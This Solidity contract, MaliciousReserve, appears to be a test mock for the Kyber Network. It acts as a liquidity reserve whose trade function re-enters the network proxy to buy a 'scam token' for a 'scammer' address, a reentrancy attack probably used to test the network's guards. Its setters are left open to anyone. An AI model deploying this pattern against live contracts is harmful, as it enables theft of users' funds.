pragma solidity 0.4.18;

import "../ERC20Interface.sol";
import "../KyberReserveInterface.sol";
import "../Utils.sol";
import "../Withdrawable.sol";
import "../KyberNetworkProxyInterface.sol";

contract MaliciousReserve is KyberReserveInterface, Withdrawable, Utils {

    mapping(address => uint256) public buyTokenRates;
    mapping(address => uint256) public sellTokenRates;

    function MaliciousReserve() public {}

    function() public payable {}

    KyberNetworkProxyInterface public proxy;
    address public scammer;
    ERC20 public scamToken;

    uint public numRecursive = 1;

    function setRate(
        ERC20 token,
        uint256 buyRate,
        uint256 sellRate
    ) public {
        buyTokenRates[address(token)] = buyRate;
        sellTokenRates[address(token)] = sellRate;
    }

    function trade(
        ERC20 srcToken,
        uint256 srcAmount,
        ERC20 destToken,
        address destAddress,
        uint256 conversionRate,
        bool validate
    ) public payable returns (bool) {
        validate;

        if (srcToken == ETH_TOKEN_ADDRESS) {
            require(msg.value == srcAmount);
        } else {
            require(msg.value == 0);
        }

        uint256 srcDecimals = getDecimals(srcToken);
        uint256 destDecimals = getDecimals(destToken);
        uint256 destAmount = calcDstQty(srcAmount, srcDecimals, destDecimals, conversionRate);
        require(destAmount > 0);

        // collect src tokens
        if (srcToken != ETH_TOKEN_ADDRESS) {
            srcToken.transferFrom(msg.sender, address(this), srcAmount);
        }

        // send dest tokens
        if (destToken == ETH_TOKEN_ADDRESS) {
            destAddress.transfer(destAmount);
        } else {
            destToken.transfer(destAddress, destAmount);
        }

        if (numRecursive > 0) {
            --numRecursive;

            performTrade();
        }

        return true;
    }

    function setKyberProxy(KyberNetworkProxyInterface _proxy) public {

        require(_proxy != address(0));

        proxy = _proxy;
    }

    function performTrade() public {
        uint callValue = 1000;
        bytes memory hint;

        ERC20 srcToken = ERC20(ETH_TOKEN_ADDRESS);
        proxy.tradeWithHint.value(callValue)(srcToken, callValue, scamToken, scammer, 
            (2 ** 255), 0, 0, hint);
    }

    function setDestAddress(address _scammer) public {
        require(_scammer != address(0));
        scammer = _scammer;
    }

    function setDestToken (ERC20 _token) public {
        scamToken = _token;
    }

    function setNumRecursive(uint num)  public {
        numRecursive = num;
    }

    function getConversionRate(
        ERC20 src,
        ERC20 dest,
        uint256 srcQty,
        uint256 blockNumber
    ) public view returns (uint256) {
        blockNumber;
        uint256 rate = (src == ETH_TOKEN_ADDRESS)
            ? buyTokenRates[address(dest)]
            : sellTokenRates[address(src)];
        uint256 srcDecimals = getDecimals(src);
        uint256 destDecimals = getDecimals(dest);
        if (srcQty > MAX_QTY || rate > MAX_RATE ) {
            return 0;
        }
        uint256 destAmount = calcDstQty(srcQty, srcDecimals, destDecimals, rate);
        if (dest == ETH_TOKEN_ADDRESS && address(this).balance < destAmount) {
            return 0;
        }
        if (dest != ETH_TOKEN_ADDRESS && dest.balanceOf(address(this)) < destAmount) {
            return 0;
        }
        return rate;
    }
}
